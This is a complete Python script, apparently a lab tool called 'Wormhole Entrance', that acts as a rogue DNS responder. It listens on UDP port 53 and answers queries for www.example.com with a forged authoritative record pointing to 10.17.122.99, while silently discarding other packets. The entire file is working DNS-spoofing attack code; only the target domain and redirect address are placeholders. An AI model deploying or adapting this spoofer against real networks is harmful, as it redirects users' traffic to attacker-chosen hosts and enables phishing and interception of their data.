import socket
import struct
import signal
import sys
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP

# Global flag for graceful shutdown
running = True
sock = None

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global running, sock
    running = False
    print("\n[*] Shutting down Wormhole Entrance...")
    if sock:
        sock.close()
    sys.exit(0)

# Register signal handler for Ctrl+C
signal.signal(signal.SIGINT, signal_handler)

# Configuration
target_domain = "www.example.com"
wormhole_exit = "10.17.122.99"

def create_wormhole(data, addr):
    """Process DNS query and send spoofed response"""
    try:
        # Parse DNS packet
        dns_request = DNS(data)
        
        # Check if it's a DNS query for our target domain
        if dns_request.haslayer(DNSQR):
            query = dns_request[DNSQR]
            if target_domain.encode() in query.qname:
                print(f"[!] Wormhole Entrance Triggered: Tunneling {target_domain} to {wormhole_exit}")
                
                # Build DNS response
                response = DNS(
                    id=dns_request.id,
                    qd=dns_request.qd,
                    aa=1,
                    qr=1,
                    an=DNSRR(rrname=query.qname, ttl=10, rdata=wormhole_exit)
                )
                
                # Send response back to client
                sock.sendto(bytes(response), addr)
                print("[+] Spoofed DNS response sent!")
    except Exception as e:
        pass  # Silently ignore non-DNS packets

print(f"[*] Wormhole Entrance active... waiting for traffic to {target_domain}")
print(f"[*] Using UDP socket")

try:
    # Create UDP socket and bind to DNS port
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Set socket timeout for responsive Ctrl+C handling
    sock.settimeout(1.0)
    
    # Try to bind on all interfaces on port 53
    try:
        sock.bind(("0.0.0.0", 53))
        print("[*] Listening on 0.0.0.0:53")
    except PermissionError:
        # If can't bind to 53, use high port for testing
        sock.bind(("127.0.0.1", 5353))
        print("[*] Listening on 127.0.0.1:5353 (requires admin for port 53)")
    
    # Listen for DNS queries
    while running:
        try:
            data, addr = sock.recvfrom(512)
            create_wormhole(data, addr)
        except socket.timeout:
            # Timeout allows checking the running flag
            continue
        
except Exception as e:
    print(f"\n[CRITICAL ERROR] {e}")
    print("Make sure to run PowerShell as Administrator to use port 53.")
finally:
    if sock:
        sock.close()
    print("[*] Wormhole Entrance closed.")